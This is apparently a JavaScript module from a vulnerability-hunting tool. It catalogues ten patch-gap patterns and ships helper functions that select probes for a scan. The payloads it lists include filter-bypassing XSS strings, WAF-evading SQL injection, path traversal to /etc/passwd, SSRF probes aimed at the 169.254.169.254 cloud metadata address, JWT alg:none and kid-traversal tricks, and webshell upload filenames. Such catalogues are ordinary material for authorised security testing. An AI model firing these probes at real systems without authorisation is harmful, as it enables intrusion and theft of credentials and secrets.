// Dark Matter hunt-intel — variant analysis / patch-gap mining (technique #2).
//
// Practitioners call this the highest-yield zero-day method: take a CVE patch,
// extract the VULNERABILITY PATTERN, then hunt the target for UNPATCHED
// VARIANTS of the same pattern — and read blacklist filters to bypass the
// encodings/aliases the patch missed.
//
// This module seeds a pattern library from famous patch-gap cases. Each entry
// describes: the pattern, what the patch fixed, what variants to hunt, and
// filter-bypass probes. The hunt planner uses these to direct variant hunts.

export const VARIANT_PATTERNS = [
  {
    id: 'VAR-001',
    family: 'filter_bypass',
    title: 'Blacklist filter bypass via encoding variants',
    pattern: 'Input filter blocks literal <script> / SELECT / ../ sequences.',
    patchGap: 'Patches usually block ONE encoding; missed: double-encoding (%253C), unicode overlong, HTML entities, mixed case, null-byte truncation.',
    huntFor: ['%253Cscript%253E', '%c0%bcscript%c0%be', '&#x3C;script&#x3E;', '<ScRiPt>', '<script%00>', '<<script>script>'],
    severity: 'high',
  },
  {
    id: 'VAR-002',
    family: 'sqli_variant',
    title: 'WAF-bypassed SQL injection variants',
    pattern: 'WAF blocks UNION SELECT with spaces and quotes.',
    patchGap: 'Missed: inline comments (/**/ instead of spaces), charcode/chr() string building, stacked queries via ;, alternative encodings.',
    huntFor: ['UNION/**/SELECT', 'CHR(83)||CHR(81)||CHR(76)', "';WAITFOR DELAY'0:0:5'--", '1=1/*'],
    severity: 'critical',
  },
  {
    id: 'VAR-003',
    family: 'path_traversal_variant',
    title: 'Path traversal filter variants',
    pattern: 'Filter strips ../ sequences once.',
    patchGap: 'Missed: double-encoding (%252e%252e), ....//  (nested), absolute paths, backslash on Windows, unicode normalization.',
    huntFor: ['....//....//etc/passwd', '%252e%252e%252f', '..\\..\\windows\\win.ini', '/etc/passwd%00'],
    severity: 'high',
  },
  {
    id: 'VAR-004',
    family: 'ssrf_variant',
    title: 'SSRF allowlist bypass variants',
    pattern: 'Allowlist checks the URL prefix or a simple domain match.',
    patchGap: 'Missed: DNS rebinding, redirect chains, @-userinfo tricks (http://trusted@evil), decimal/hex IP forms, 0.0.0.0 / [::].',
    huntFor: ['http://trusted.com@169.254.169.254/', 'http://2130706433/', 'http://[::ffff:169.254.169.254]/', 'http://0.0.0.0/'],
    severity: 'critical',
  },
  {
    id: 'VAR-005',
    family: 'auth_variant',
    title: 'Authentication logic variants',
    pattern: 'Login compares password with == (loose) or truncates input.',
    patchGap: 'Missed: type-juggling (0e123 == 0), array input bypass (password[]=), null-byte in username, case-variant usernames.',
    huntFor: ['password[]=anything', '0e123456789', 'admin%00', 'ADMIN vs admin'],
    severity: 'critical',
  },
  {
    id: 'VAR-006',
    family: 'idor_variant',
    title: 'IDOR via parameter variants',
    pattern: 'API checks /users/{id} but not /users/{id}/profile or batch endpoints.',
    patchGap: 'Missed: nested routes, GraphQL field-level access, export/report endpoints, mobile-API versions of the same resource.',
    huntFor: ['/api/v2/users/{id}', '/users/{id}/export', 'batch endpoint with id arrays', 'GraphQL nested resolvers'],
    severity: 'high',
  },
  {
    id: 'VAR-007',
    family: 'jwt_variant',
    title: 'JWT validation variants',
    pattern: 'Server validates signature but trusts the alg header.',
    patchGap: 'Missed: alg:none, RS256->HS256 confusion, kid path traversal, jku/x5u header injection.',
    huntFor: ['{"alg":"none"}', 'HS256 with RSA public key as HMAC secret', 'kid=../../dev/null', 'jku to attacker URL'],
    severity: 'critical',
  },
  {
    id: 'VAR-008',
    family: 'upload_variant',
    title: 'File upload filter variants',
    pattern: 'Filter checks extension blacklist (.php, .exe).',
    patchGap: 'Missed: double extensions (.php.jpg), case (.pHp), trailing dot, MIME spoofing, polyglot files, .htaccess upload.',
    huntFor: ['shell.pHp', 'shell.php.', 'shell.php.jpg', '.htaccess with AddType'],
    severity: 'critical',
  },
  {
    id: 'VAR-009',
    family: 'xss_variant',
    title: 'XSS filter variants in rich contexts',
    pattern: 'Filter strips <script> tags.',
    patchGap: 'Missed: event handlers (onerror=), SVG/math contexts, javascript: URLs, template-literal breakouts, DOM clobbering.',
    huntFor: ['<svg onload=>', '<img src=x onerror=>', 'javascript:alert()', '{{constructor.constructor()}}'],
    severity: 'high',
  },
  {
    id: 'VAR-010',
    family: 'race_variant',
    title: 'Race-condition variants (TOCTOU)',
    pattern: 'Single request is safe; concurrent requests are not tested.',
    patchGap: 'Coupon/discount double-spend, vote count manipulation, file-upload AV-scan bypass, password-reset token reuse.',
    huntFor: ['parallel coupon redemption', 'parallel vote requests', 'reset token used twice concurrently'],
    severity: 'high',
  },
];

/** Suggest variant probes relevant to observed finding classes. */
export function suggestVariants(findingClasses) {
  const classes = new Set((findingClasses || []).map((c) => String(c).toLowerCase()));
  return VARIANT_PATTERNS.filter((p) => {
    const fam = p.family;
    if (classes.size === 0) return true;
    for (const c of classes) {
      if (fam.includes(c.replace(/[^a-z]/g, '')) || c.includes(fam.split('_')[0])) return true;
    }
    return false;
  });
}

/** All variant probes for a blind variant-mining pass. */
export function allVariantProbes() {
  return VARIANT_PATTERNS.flatMap((p) =>
    p.huntFor.map((probe) => ({ patternId: p.id, family: p.family, probe, severity: p.severity }))
  );
}
